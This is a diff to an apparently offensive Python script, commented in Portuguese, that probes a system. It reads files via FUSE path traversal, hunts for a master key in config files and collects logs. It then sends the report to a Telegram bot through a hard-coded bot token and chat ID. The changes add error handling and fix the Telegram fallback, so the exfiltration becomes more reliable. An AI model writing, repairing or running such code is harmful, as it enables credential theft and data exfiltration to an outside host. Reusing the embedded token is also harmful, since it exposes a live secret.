@@ -7,16 +7,13 @@ Nenhum arquivo é deletado ou modificado permanentemente.
 """
 
 import os
-import sys
 import subprocess
 import time
 import json
 import base64
-import socket
 import requests
 import re
 from datetime import datetime, timezone
-from pathlib import Path
 
 # =================== CONFIGURAÇÃO ===================
 BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
@@ -28,9 +25,11 @@ TIMEOUT_NET = 15
 
 log_lines = []
 
+
 def add_log(msg=""):
     log_lines.append(str(msg))
     print(msg)
+
 
 def sh(cmd, timeout=TIMEOUT_CMD):
     try:
@@ -39,15 +38,18 @@ def sh(cmd, timeout=TIMEOUT_CMD):
     except Exception as e:
         return f"(ERRO: {e})"
 
+
 def file_read(path):
     try:
-        with open(path, 'r') as f:
+        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
             return f.read()
-    except:
+    except Exception:
         return None
+
 
 def exists(path):
     return os.path.exists(path)
+
 
 def section(title):
     add_log("\n" + "=" * 80)
@@ -152,10 +154,10 @@ def extract_files_via_fuse():
             # Se não encontrou, tenta com glob
             try:
                 import glob
-                for f in glob.glob(os.path.join(fuse_root, "../../..", pattern.lstrip("/")), recursive=True):
-                    if os.path.isfile(f):
-                        add_log(f"\nLendo {f}:")
-                        with open(f, 'r', errors='ignore') as fd:
+                for fpath in glob.glob(os.path.join(fuse_root, "../../..", pattern.lstrip("/")), recursive=True):
+                    if os.path.isfile(fpath):
+                        add_log(f"\nLendo {fpath}:")
+                        with open(fpath, 'r', errors='ignore') as fd:
                             add_log(fd.read(1000))
             except Exception:
                 pass
@@ -244,7 +246,9 @@ def search_master_key():
     for cfg in grok_configs:
         if exists(cfg):
             add_log(f"\nConteúdo de {cfg}:")
-            add_log(file_read(cfg)[:2000])
+            content = file_read(cfg)
+            if content:
+                add_log(content[:2000])
 
 # ================================================================
 # 7. COLETAR LOGS E HISTÓRICO
@@ -295,8 +299,11 @@ def main():
 
     # Salvar log
     full_log = "\n".join(log_lines)
-    with open(LOG_FILE, "w", encoding="utf-8") as f:
-        f.write(full_log)
+    try:
+        with open(LOG_FILE, "w", encoding="utf-8") as f:
+            f.write(full_log)
+    except Exception as e:
+        print(f"Erro ao salvar log: {e}")
 
     print(f"Log salvo em {LOG_FILE} ({len(full_log)} bytes)")
 
@@ -311,11 +318,15 @@ def main():
             print("✅ Relatório enviado para o Telegram!")
         else:
             print(f"❌ Falha: {response.text}")
-            # Fallback texto
-            requests.post("https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                          json={'chat_id': CHAT_ID, 'text': full_log[:4000]})
+            # Fallback texto (corrigido para f-string)
+            try:
+                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                              json={'chat_id': CHAT_ID, 'text': full_log[:4000]}, timeout=30)
+            except Exception as e:
+                print(f"Erro no fallback do Telegram: {e}")
     except Exception as e:
         print(f"Erro no envio: {e}")
+
 
 if __name__ == "__main__":
     main()
